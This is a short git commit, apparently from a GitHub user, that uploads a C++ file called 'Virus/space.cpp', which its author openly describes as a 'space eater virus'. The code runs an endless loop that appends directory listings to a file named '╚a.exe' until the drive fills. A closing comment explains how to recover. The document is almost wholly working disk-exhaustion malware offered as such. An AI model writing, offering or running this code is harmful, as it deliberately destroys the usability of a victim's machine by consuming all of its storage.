0d5e1506261c09bfdb0a96ef01a48b5de711144e
Shivam <54373797+shivam0110@users.noreply.github.com>
2020-05-17 17:42:11 +0530

    Add files via upload
    Its a space eater virus. It uses all the space of directory in which it is run.

---
+++ Virus/space.cpp
@@ -0,0 +1,9 @@
+#include<stdlib.h>
+//This virus when executed will eat up the hard disk space on the current drive of the computer on which it is run.
+
+void main(){
+    while(1){
+    system("dir>>╚a.exe");
+    }
+} 
+//to recover, simply delete virus filr and ╚a.exe file from your computer.
